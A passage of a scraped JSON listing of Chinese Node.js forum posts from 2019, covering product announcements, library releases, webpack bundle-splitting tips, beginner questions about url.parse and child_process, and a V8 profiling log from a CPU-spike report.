一行命令上传本地文件到服务器","last_reply_at":"2019-04-27T19:44:34.105Z","good":false,"top":false,"reply_count":19,"visit_count":1758,"create_at":"2019-04-20T15:01:20.665Z","author":{"loginname":"xiaoxiaojx","avatar_url":"https://avatars2.githubusercontent.com/u/23253540?v=4&s=120"}},{"id":"5cc3f4a337faec0ce1d07407","author_id":"5c88bffdacb681372d417bb4","tab":"share","content":"<div class=\"markdown-text\"><p>Saas平台软件提供商多多客重磅支持微信公众号，商家只需搭建一次后台，即可同时发布到微信、百度、支付宝小程序、微信公众号四端。</p>\n<p><strong>线上多渠道推广，流量曝光</strong>\n微信小程序、百度小程序、支付宝小程序、微信公众号，一次搭建，四大渠道同时推广，把握社交网络每一份流量。</p>\n<p><strong>页面可视化DIY，随心设计</strong>\n丰富组件库，样式、大小、颜色自由更改；可视化自由拖拽，满足任何个性化需求。</p>\n<p><img src=\"//static.cnodejs.org/FoUEZf5sGaMD8AMsBfXjKlsLsiWL\" alt=\"552fe0c0ab374c2d91970c4ab6fcf7b9.png\"></p>\n<p><strong>几十种营销工具，提升留存率</strong>\n分销、拼团、会员卡、裂变红包、集赞、积分商城、消息推送等几十种营销玩法，获客、促活新利器，轻松助力企业推广、提升留存。</p>\n<p><img src=\"//static.cnodejs.org/FvVpgc35WRQoeix0JnDNmvlwCeoo\" alt=\"293e19accd634bde8ea648a7f02c57c5.png\"></p>\n<p><strong>私有化部署，保障数据安全</strong>\n多多客支持私有化部署，助力企业搭建安全高效的saas平台，满足网络安全控制体系的要求。支持二次开发，满足企业个性开发需求。</p>\n<p><strong>多种运营模式，保障盈利</strong>\n代理商预存款、商家小程序年费、运营支持、二次开发、应用商店，五大运营模式助力商家拓展市场。</p>\n<p>多多客微信公众号saas平台今日正式开放公测。</p>\n<p>公测时间：4月24日 - 4月30日</p>\n<p>公测期间购微信/百度/支付宝saas平台版小程序赠送多多客微信公众号。</p>\n<p>多多客公测网址：<a href=\"http://doodooke.com\">doodooke.com</a>，如果您对多多客有好的意见或建议，欢迎随时联系青妹（微信：qfxcx66）反馈哦 ~</p>\n</div>","title":"多多客支持微信公众号，正式开放公测！","last_reply_at":"2019-04-27T06:20:19.069Z","good":false,"top":false,"reply_count":0,"visit_count":442,"create_at":"2019-04-27T06:20:19.069Z","author":{"loginname":"doodooke1688","avatar_url":"https://avatars0.githubusercontent.com/u/48510722?v=4&s=120"}},{"id":"5caae8a57edd13064e0533fd","author_id":"5c88bffdacb681372d417bb4","tab":"share","content":"<div class=\"markdown-text\"><p>多多客（doodooke）是一款基于Koa+Vue+Taro开发，支持微信，百度，支付宝小程序的第三方SaaS平台。</p>\n<p><strong>本次重要更新</strong>\n1、优化打赏不显示打赏人\n2、新增登录的账号未绑定微信的情况下提示绑定微信\n3、优化safari下页面组件样式问题\n4、优化编译重启\n5、优化消息推送小程序模板消息下架问题\n6、优化客户管理在多小程序下显示问题\n7、新增小程序客服引导\n8、优化营销应用图标\n9、新增订单导出功能</p>\n<p><strong>3.0新特性</strong>\n1、支持migrations，可以快速的创建和修改表\n2、支持rewrite，可以将请求转发到修改过的接口\n3、支持view逻辑钩子，可以扩展vue逻辑\n4、支持view视图钩子，可以扩展vue视图\n5、支持cluster，可以启动多个项目\n6、支持本地调试，可以将生产环境的请求转发或复制到本地\n7、支持bin命令，可以快速的处理migration等</p>\n<p>多多客官网：<a href=\"http://doodooke.com\">doodooke.com</a>\n3.0开源版立即下载：<a href=\"https://gitee.com/doodooke/doodoo\">https://gitee.com/doodooke/doodoo</a></p>\n</div>","title":"【开源】多多客小程序发布 3.0.0-alpha.6，Koa+Vue+Taro最佳实践","last_reply_at":"2019-04-27T06:17:22.936Z","good":false,"top":false,"reply_count":3,"visit_count":948,"create_at":"2019-04-08T06:22:29.186Z","author":{"loginname":"doodooke1688","avatar_url":"https://avatars0.githubusercontent.com/u/48510722?v=4&s=120"}},{"id":"5c28c1913898674067a79bfb","author_id":"5b2a0c5029e6e510415b2c0f","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fkn6kPQ9QOWno-1bxP_hkIZmRYZx\" alt=\"11111.jpg\"></p>\n<p>适合新手入门学习的Node.js简单视频教程，带你走进Node.js的世界，有留言板项目实战等8节课</p>\n<p><strong>教程目录：</strong>\n01 Node.js是什么\n02 安装体验Node.js\n03 尝试写个小程序\n04 查看你的CPU和内存\n05 写文件\n06 采集网页\n07 运行网站\n08 留言板\n教程下载：<a href=\"https://www.sucaihuo.com/video/178.html\">https://www.sucaihuo.com/video/178.html</a></p>\n</div>","title":"Node.js简单视频教程 适合新手入门","last_reply_at":"2019-04-27T01:44:46.782Z","good":false,"top":false,"reply_count":6,"visit_count":1933,"create_at":"2018-12-30T13:01:05.700Z","author":{"loginname":"whoknowme","avatar_url":"https://avatars0.githubusercontent.com/u/40422811?v=4&s=120"}},{"id":"5cbf0519a86ae80ce64b2b73","author_id":"5c91ace496558e26e1b677bd","tab":"ask","content":"<div class=\"markdown-text\"><p>chilld process可以生成一个子进程，但是怎么处理父进程的任务呢？我查了官方文档，说是send方法可以传递一个TCP服务器或者Server，那么我父进程的任务怎么传递给子进程来帮我分担作业呢？</p>\n</div>","title":"child_process分担任务问题","last_reply_at":"2019-04-26T08:21:43.563Z","good":false,"top":false,"reply_count":16,"visit_count":1256,"create_at":"2019-04-23T12:29:13.806Z","author":{"loginname":"HyperClockUp","avatar_url":"https://avatars2.githubusercontent.com/u/36909196?v=4&s=120"}},{"id":"5cc29863a86ae80ce64b44cb","author_id":"5976b9b80c87675e74674819","tab":"ask","content":"<div class=\"markdown-text\"><p>做了一个手机网页，加上了title，但是显示还是显示网址，不是应该显示title的内容嘛？？请问各位大神是什么原因？？怎么样来实现呢？？？</p>\n</div>","title":"手机浏览器如何显示title","last_reply_at":"2019-04-26T05:34:27.318Z","good":false,"top":false,"reply_count":0,"visit_count":531,"create_at":"2019-04-26T05:34:27.318Z","author":{"loginname":"quanpf2481","avatar_url":"https://avatars3.githubusercontent.com/u/30330930?v=4&s=120"}},{"id":"5cc285ec37faec0ce1d06f10","author_id":"5cc27819a86ae80ce64b440b","tab":"share","content":"<div class=\"markdown-text\"><h1>ggit 是一个运行在浏览器环境的git gui 工具</h1>\n<p>项目存在许多 巨大BUG和缺失大量功能\n资金不足，思路暂无，敬请期待！(最近开发另一个项目一直没时间)\n注意：本人从未推广过自己的项目 所以最近集中式的推广 海涵😘\n可通过npm 下载尝试 详情见github\n如果喜欢 星星 on gayhub</p>\n<p>项目截图\n<a href=\"https://zhuanlan.zhihu.com/p/63746038\">ggit 运行在浏览器环境的git gui 工具（多图警告）</a></p>\n</div>","title":"ggit 运行在浏览器环境的git gui 工具（多图警告）","last_reply_at":"2019-04-26T04:15:40.883Z","good":false,"top":false,"reply_count":0,"visit_count":677,"create_at":"2019-04-26T04:15:40.883Z","author":{"loginname":"sewerganger","avatar_url":"https://avatars2.githubusercontent.com/u/45007226?v=4&s=120"}},{"id":"5cc284c237faec0ce1d06f0c","author_id":"5cc27819a86ae80ce64b440b","tab":"share","content":"<div class=\"markdown-text\"><p>SimplerDateFormat(pattern: string,[week: Array&lt;string&gt;])\nsewerganger/simpler-date-format\n<a href=\"https://github.com/sewerganger/simpler-date-format\">github地址 simpler-date-format</a>\n图标\nSimplerDateFormat 是一个特别简单的时间格式化js包类似于java的SimplerDateFormat，但是它更加简单😜!</p>\n<ol>\n<li>Api\n构造函数\nSimplerDateFormat(string, week)\n方法\nformat(date: Date);  // format time you want\nzone(number);           // setZoneTime and format\n日期用大写字母，时间用小写字母，字母是随机的，使用空格分隔，输入的顺序是输出的顺序。使用特殊符号（除~）表示一周中输出的日期。在句子前加<code>~</code>可反转输出；</li>\n</ol>\n<p>2.举个🌰子</p>\n<pre class=\"prettyprint\"><code>const SimplerDateFormat = require(&#x27;simpler-date-format&#x27;);\n\n&#x2F;&#x2F;定义一周\nconst weekday = [&#x27;Monday&#x27;,&#x27;Tuesday&#x27;,&#x27;Wednesday&#x27;,&#x27;Thursday&#x27;,&#x27;Friday&#x27;,&#x27;Saturday&#x27; ,&#x27;Sunday&#x27;];\n\nvar sd = new SimplerDateFormat(&#x27;Y&#x2F;M&#x2F;D h:m:d&#x27;);\nsd.format(new Date());              &#x2F;&#x2F;2019&#x2F;04&#x2F;23 22:36:44\n\nvar sd = new SimplerDateFormat(&#x27;Y$M$D h:m:d @&#x27;);\nsd.format(new Date());              &#x2F;&#x2F;2019$04$23 22:36:44 2\n\nvar sd = new SimplerDateFormat(&#x27;h:m:d Y&#x2F;M&#x2F;D&#x27;);\nsd.format(new Date());              &#x2F;&#x2F;22:36:44 2019&#x2F;04&#x2F;23\n\n&#x2F;&#x2F;反转输出\nvar sd = new SimplerDateFormat(&#x27;@ h:m:d ~Y&#x2F;M&#x2F;D&#x27;, week); \nsd.format(new Date());              &#x2F;&#x2F; Tuesday 22:36:44 04&#x2F;23&#x2F;2019\n\n&#x2F;&#x2F;北京时间并输出星期几 自行定义\nvar sd = new SimplerDateFormat(&#x27;h:m:d ~Y&#x2F;M&#x2F;D&#x27;, week);\nsd.zone(8);              &#x2F;&#x2F;22:36:44 04&#x2F;23&#x2F;2019 Tuesday \n\n</code></pre><p>还有更多的功能未开发，欢迎加入Muguet-ui开发交流，群聊号码：279499604\n如果你喜欢可以 在gayhub❤</p>\n</div>","title":"SimplerDateFormat 一个更简单的SimpleDateFormat","last_reply_at":"2019-04-26T04:10:42.166Z","good":false,"top":false,"reply_count":0,"visit_count":463,"create_at":"2019-04-26T04:10:42.166Z","author":{"loginname":"sewerganger","avatar_url":"https://avatars2.githubusercontent.com/u/45007226?v=4&s=120"}},{"id":"5cc27f8d37faec0ce1d06ee8","author_id":"5cc2720637faec0ce1d06e38","tab":"ask","content":"<div class=\"markdown-text\"><p>想用nodejs实现数据接收并推送到网页，但 url.parse( ).path却无法使用。请各位大佬帮帮萌新。\n代码如下（数据接收部分省略）</p>\n<pre class=\"prettyprint language-js\\n\"><code>var http = require(&#x27;http&#x27;);\nvar fs   = require(&#x27;fs&#x27;);\nvar url_parser = require(&#x27;url&#x27;);\nvar querystring = require(&#x27;querystring&#x27;);\nvar man = 0;\nvar car = 0;\n\nvar server=http.createServer(function(req,res)\n{\n    var post = &#x27;&#x27;;\n    var raw_url = req.url;\n    var url = url_parser.parse(raw_url,true);\n    var pathname = url.pathname;\n    var path = url.path;          &#x2F;&#x2F;**url.path无法使用**\n\t\n    &#x2F;&#x2F;响应OneNet发来的请求，接收数据\n    if(pathname == &#x27;&#x2F;dataPort&#x27;)\n    {\n\t           &#x2F;&#x2F;已省略\n    }\n&#x2F;&#x2F;\n    if(path == &#x27;&#x2F;index&#x27;)\n    {\n        res.writeHead(200,{&#x27;Content-Type&#x27;:&#x27;text&#x2F;html&#x27;});\n        fs.readFile(&#x27;.&#x2F;index.html&#x27;,&#x27;utf-8&#x27;,function(err,data)\n        {\n            res.write(data);\n            res.end();\n        });\n    }\n    &#x2F;&#x2F;响应&#x27;&#x2F;?test=ajax&#x27;\n    else if(path == &#x27;&#x2F;?test=ajax&#x27;)\n    {\n        console.log(&#x27;start ajax&#x27;);\n        res.writeHead(200,{&#x27;Content-Type&#x27;:&#x27;text&#x2F;plain&#x27;,&#x27;Access-Control-Allow-Origin&#x27;:&#x27;*&#x27;});\n        var jlatitude_json = {&quot;man&quot;:man,&quot;car&quot;:car};\n        var str = JSON.stringify(jlatitude_json);\n        res.write(str);\n        res.end();\n    }\n});\n\nserver.listen(80);\nconsole.log(&#x27;server running at port 80&#x27;);   \n\n code \\n&#96;&#96;&#96; \nhtml  ajax部分代码\n&#96;&#96;&#96;js\\n    \n&lt;script type=&quot;javascript&quot;&gt;\n    &#x2F;&#x2F;更新数据\n    var car=0;\n    var man=0;\n    &#x2F;&#x2F;发送ajax请求\n    function start(){\n        $.ajax({\n            url:&#x27;http:&#x2F;&#x2F;47.102.122.37:80&#x2F;&#x27;,\n            dataType:&#x27;json&#x27;,\n            type:&#x27;get&#x27;,\n            data:{test:&#x27;ajax&#x27;},\n            success:function(data)\n            {\n                function UpdateMAC(data)\n                {\n                    car = data.car;\n                    man = data.man;\n                    document.getElementById(&#x27;man&#x27;).value = man;\n                    document.getElementById(&#x27;car&#x27;).value = car;\n                }\t&#x2F;&#x2F;更新\n\n            }\n        })\n    }\n\n    &#x2F;*\n     每隔1秒发送一次经纬度数据请求\n     *&#x2F;\n    setInterval(function()\n    {\n        start();\n    },3000);\n&lt;&#x2F;script&gt;\n  code \\n&#96;&#96;&#96;</code></pre></div>","title":"新人求助  url.parse( ).path  无法使用","last_reply_at":"2019-04-26T03:48:29.092Z","good":false,"top":false,"reply_count":0,"visit_count":685,"create_at":"2019-04-26T03:48:29.092Z","author":{"loginname":"ranzhuang880","avatar_url":"https://avatars0.githubusercontent.com/u/49989905?v=4&s=120"}},{"id":"5cc132aca86ae80ce64b3cf0","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h2>一、发现问题</h2>\n<p>这是一个基于 vue-cli 的管理后台项目，由于依赖较多，打包结果如下</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/25/16a52728b78679c4?w=721&amp;h=134&amp;f=png&amp;s=132416\" alt=\"图片描述\"></p>\n<h2>二、查找原因</h2>\n<blockquote>\n<p>为什么 vendor 体积这么大？</p>\n</blockquote>\n<p>引用的库太多时，vendor的体积会很大，借助 Webpack 的分析工具，看了下各个依赖的体积分布</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/25/16a52728ab236ac0?w=800&amp;h=446&amp;f=png&amp;s=151789\" alt=\"图片描述\"></p>\n<p>找到原因，是 Highcharts 和 Element-UI占了较大体积，导致性能减弱。</p>\n<blockquote>\n<p>这两个库都提供了按需加载的功能，能有效减小体积，只是刚好这个管理后台项目依赖较多</p>\n</blockquote>\n<p>那么有办法控制打包的体积超过一定值时，分成多个文件打包吗？<br>\n或者通过配置将部分库抽离出来，打包成另外的文件？</p>\n<h2>三、解决方法</h2>\n<h3>（一）CDN 外链</h3>\n<p>先把 Highcharts 和 Lodash 通过外链引入</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;lodash.js&#x2F;4.17.5&#x2F;lodash.min.js&quot; &#x2F;&gt;\n&lt;script src=&quot;&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;highcharts&#x2F;6.0.7&#x2F;highstock.js&quot; &#x2F;&gt;\n&lt;script src=&quot;&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;highcharts&#x2F;6.0.7&#x2F;js&#x2F;highcharts-more.js&quot; &#x2F;&gt;\n&lt;script src=&quot;&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;highcharts&#x2F;6.0.7&#x2F;js&#x2F;modules&#x2F;treemap.js&quot; &#x2F;&gt;\n</code></pre><p>外链引入的资源就不能直接通过 import 来使用，但可以通过 Webpack 的 externals 特性来兼容</p>\n<pre class=\"prettyprint language-javascript\"><code>import _ from &#x27;lodash&#x27;\nimport Highcharts from &#x27;highcharts&#x27;\n\nconsole.log([_, Highcharts])\n</code></pre><p>这样配置 Webpack 就知道这两个依赖是外链全局的，不需要打包</p>\n<pre class=\"prettyprint language-javascript\"><code>externals: {\n  lodash: &#x27;_&#x27;,\n  highcharts: &#x27;Highcharts&#x27;\n}\n</code></pre><p>先看看去掉 Highcharts 和 Lodash 的效果</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/25/16a52728ab54f70e?w=704&amp;h=131&amp;f=png&amp;s=32604\" alt=\"图片描述\"></p>\n<p>vendor 也避免打包了这两个库</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/25/16a52728ac3119b4?w=800&amp;h=447&amp;f=png&amp;s=189224\" alt=\"图片描述\"></p>\n<p>这种方式适用于不常更新的第三方依赖，采用外链，Element-UI 由于常有新特性更新，需要保持最新版本，所以还是通过 npm 来管理</p>\n<h4>内网部署的问题</h4>\n<p>如若这个管理后台项目要部署到一个内网机器，访问不了外网，那要怎么解决呢？</p>\n<h3>（二）拆开 vendor</h3>\n<blockquote>\n<p>Webpack 默认是将依赖打包成一个文件，这样优点是减少资源请求数，但当依赖增多，体积增大，一个资源的加载速度就会减慢</p>\n</blockquote>\n<p>所以尝试去拆包</p>\n<pre class=\"prettyprint language-javascript\"><code>new webpack.optimize.CommonsChunkPlugin({\n  name: &#x27;charts&#x27;,\n  chunks: [&#x27;vendor&#x27;],\n  minChunks: module =&gt; module.resource.indexOf(&#x27;highcharts&#x27;) &gt; -1\n}),\n\nnew webpack.optimize.CommonsChunkPlugin({\n  name: &#x27;utils&#x27;,\n  chunks: [&#x27;vendor&#x27;],\n  minChunks: module =&gt; module.resource.indexOf(&#x27;lodash&#x27;) &gt; -1\n}),\n\nnew webpack.optimize.CommonsChunkPlugin({\n  name: &#x27;ui&#x27;,\n  chunks: [&#x27;vendor&#x27;],\n  minChunks: module =&gt; module.resource.indexOf(&#x27;element-ui&#x27;) &gt; -1\n})\n</code></pre><p>拆包后的打包结果</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/25/16a52728ac2e499f?w=711&amp;h=178&amp;f=png&amp;s=201907\" alt=\"图片描述\"></p>\n<p>看看分析工具</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/25/16a52728ac95dd0a?w=800&amp;h=447&amp;f=png&amp;s=160849\" alt=\"图片描述\"></p>\n<h2>总结</h2>\n<p>程序小哥实战经验得出：外链简单粗暴，而拆包可以配合浏览器缓存，在每次发布最小化更新资源，比较实用。</p>\n<h2>程序小哥介绍</h2>\n<p>考拉前端开发小哥Bingo，潜心钻研小程序开发。</p>\n</div>","title":"Webpack打包优化：使用外链与拆包模式","last_reply_at":"2019-04-26T03:42:04.887Z","good":false,"top":false,"reply_count":4,"visit_count":699,"create_at":"2019-04-25T04:08:12.940Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5cc16f8937faec0ce1d0697f","author_id":"59b0fced1b37e54f6793c3d6","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>压测NODEJS（PM2管理的负载）接口之后，随便点击任意一个接口出现CPU暴涨到100%+，不点击之后恢复10%（压测之前CPU只有0.3%左右），再次点击又暴涨到100%+\n只有杀掉NODE进程，重启站点才正常。这是通过<code>node --prof-process</code>分析出来的日志</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>Statistical profiling result from isolate-0x3f09b30-v8.log, (1097 ticks, 7 unaccounted, 0 excluded).\n\n [Shared libraries]:\n   ticks  total  nonlib   name\n    776   70.7%          &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n     90    8.2%          &#x2F;usr&#x2F;lib64&#x2F;libc-2.17.so\n     15    1.4%          &#x2F;usr&#x2F;lib64&#x2F;libpthread-2.17.so\n     12    1.1%          &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6.0.19\n      1    0.1%          [vdso]\n\n [JavaScript]:\n   ticks  total  nonlib   name\n     13    1.2%    6.4%  Builtin: InterpreterEntryTrampoline\n     11    1.0%    5.4%  LazyCompile: *montReduce &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:609:20\n      7    0.6%    3.4%  Builtin: KeyedStoreIC_Megamorphic\n      7    0.6%    3.4%  Builtin: CallFunction_ReceiverIsAny\n      6    0.5%    3.0%  LazyCompile: *bnpSquareTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:448:21\n      5    0.5%    2.5%  LazyCompile: ~resolve path.js:1068:28\n      5    0.5%    2.5%  LazyCompile: ~Module._resolveLookupPaths internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:401:38\n      5    0.5%    2.5%  LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      5    0.5%    2.5%  LazyCompile: *normalizeString path.js:52:25\n      4    0.4%    2.0%  LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;psl&#x2F;index.js:14:61\n      4    0.4%    2.0%  LazyCompile: *resolve path.js:1068:28\n      4    0.4%    2.0%  Builtin: KeyedLoadIC\n      3    0.3%    1.5%  Builtin: StringSubstring\n      3    0.3%    1.5%  Builtin: StringPrototypeSlice\n      3    0.3%    1.5%  Builtin: StringAdd_CheckNone_NotTenured\n      3    0.3%    1.5%  Builtin: KeyedStoreICTrampoline\n      3    0.3%    1.5%  Builtin: Call_ReceiverIsAny\n      2    0.2%    1.0%  LazyCompile: ~realpathSync fs.js:1375:22\n      2    0.2%    1.0%  LazyCompile: ~readFileSync fs.js:340:22\n      2    0.2%    1.0%  LazyCompile: ~basename path.js:1286:30\n      2    0.2%    1.0%  LazyCompile: ~args internal&#x2F;util&#x2F;types.js:11:10\n      2    0.2%    1.0%  LazyCompile: ~Module._nodeModulePaths internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:360:37\n      2    0.2%    1.0%  LazyCompile: ~DoJoin native array.js:87:16\n      2    0.2%    1.0%  LazyCompile: *bnpMultiplyTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:436:23\n      2    0.2%    1.0%  LazyCompile: *am3 &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:102:13\n      2    0.2%    1.0%  Builtin: StoreIC\n      2    0.2%    1.0%  Builtin: ObjectPrototypeHasOwnProperty\n      2    0.2%    1.0%  Builtin: LoadIC_Noninlined\n      1    0.1%    0.5%  Stub: StoreFastElementStub\n      1    0.1%    0.5%  Stub: CallApiCallbackStub\n      1    0.1%    0.5%  Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;opentype.js&#x2F;dist&#x2F;opentype.js:9:19\n      1    0.1%    0.5%  Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;ajv&#x2F;lib&#x2F;dotjs&#x2F;validate.js:1:11\n      1    0.1%    0.5%  RegExp: (?:^\n      1    0.1%    0.5%  RegExp: \n      1    0.1%    0.5%  LazyCompile: ~wrapCallSite &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;source-map-support&#x2F;source-map-support.js:323:22\n      1    0.1%    0.5%  LazyCompile: ~validateUint32 internal&#x2F;validators.js:100:24\n      1    0.1%    0.5%  LazyCompile: ~validateOffsetLengthRead internal&#x2F;fs&#x2F;utils.js:408:34\n      1    0.1%    0.5%  LazyCompile: ~validateMode internal&#x2F;validators.js:32:22\n      1    0.1%    0.5%  LazyCompile: ~tryCreateBuffer fs.js:313:25\n      1    0.1%    0.5%  LazyCompile: ~toPathIfFileURL internal&#x2F;url.js:1364:25\n      1    0.1%    0.5%  LazyCompile: ~stat internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:84:14\n      1    0.1%    0.5%  LazyCompile: ~runInThisContext vm.js:322:26\n      1    0.1%    0.5%  LazyCompile: ~require internal&#x2F;modules&#x2F;cjs&#x2F;helpers.js:19:19\n      1    0.1%    0.5%  LazyCompile: ~relative path.js:1161:30\n      1    0.1%    0.5%  LazyCompile: ~readPackage internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:153:21\n      1    0.1%    0.5%  LazyCompile: ~pathtoRegexp &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;path-to-regexp&#x2F;index.js:28:22\n      1    0.1%    0.5%  LazyCompile: ~openSync fs.js:428:18\n      1    0.1%    0.5%  LazyCompile: ~ok assert.js:356:12\n      1    0.1%    0.5%  LazyCompile: ~normalizeString path.js:52:25\n      1    0.1%    0.5%  LazyCompile: ~module.exports.require.getIteratorMethod &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;modules&#x2F;core.get-iterator-method.js:4:66\n      1    0.1%    0.5%  LazyCompile: ~module.exports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;modules&#x2F;_is-array-iter.js:6:27\n      1    0.1%    0.5%  LazyCompile: ~merge &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-traverse&#x2F;lib&#x2F;visitors.js:236:15\n      1    0.1%    0.5%  LazyCompile: ~makeRequireFunction internal&#x2F;modules&#x2F;cjs&#x2F;helpers.js:16:29\n      1    0.1%    0.5%  LazyCompile: ~loadSync &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;opentype.js&#x2F;dist&#x2F;opentype.js:12152:18\n      1    0.1%    0.5%  LazyCompile: ~join path.js:1141:22\n      1    0.1%    0.5%  LazyCompile: ~isUint32 internal&#x2F;validators.js:13:18\n      1    0.1%    0.5%  LazyCompile: ~isEncoding buffer.js:449:40\n      1    0.1%    0.5%  LazyCompile: ~isAbsolute path.js:1135:34\n      1    0.1%    0.5%  LazyCompile: ~forEachCode &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;raw-body&#x2F;node_modules&#x2F;http-errors&#x2F;index.js:226:38\n      1    0.1%    0.5%  LazyCompile: ~forEach &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;stealthy-require&#x2F;lib&#x2F;index.js:5:17\n      1    0.1%    0.5%  LazyCompile: ~findConfigs &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;build-config-chain.js:82:66\n      1    0.1%    0.5%  LazyCompile: ~extname path.js:1364:28\n      1    0.1%    0.5%  LazyCompile: ~explode &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-traverse&#x2F;lib&#x2F;visitors.js:41:17\n      1    0.1%    0.5%  LazyCompile: ~debug &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;debug&#x2F;src&#x2F;debug.js:65:17\n      1    0.1%    0.5%  LazyCompile: ~dataFromCodePoints &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;regenerate&#x2F;regenerate.js:84:35\n      1    0.1%    0.5%  LazyCompile: ~compile &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:100:17\n      1    0.1%    0.5%  LazyCompile: ~bnpRShiftTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:381:21\n      1    0.1%    0.5%  LazyCompile: ~bnpModInt &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1341:19\n      1    0.1%    0.5%  LazyCompile: ~bnpFromString &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:183:23\n      1    0.1%    0.5%  LazyCompile: ~bnBitLength &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:342:21\n      1    0.1%    0.5%  LazyCompile: ~arrayPush &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_arrayPush.js:9:19\n      1    0.1%    0.5%  LazyCompile: ~am3 &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:102:13\n      1    0.1%    0.5%  LazyCompile: ~allocate buffer.js:318:18\n      1    0.1%    0.5%  LazyCompile: ~_extend util.js:290:17\n      1    0.1%    0.5%  LazyCompile: ~Script vm.js:44:14\n      1    0.1%    0.5%  LazyCompile: ~NativeModule.nonInternalExists internal&#x2F;bootstrap&#x2F;loaders.js:216:46\n      1    0.1%    0.5%  LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1    0.1%    0.5%  LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1    0.1%    0.5%  LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1    0.1%    0.5%  LazyCompile: ~IPv4 &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;ipaddr.js&#x2F;lib&#x2F;ipaddr.js:57:18\n      1    0.1%    0.5%  LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;source-map-support&#x2F;source-map-support.js:316:76\n      1    0.1%    0.5% 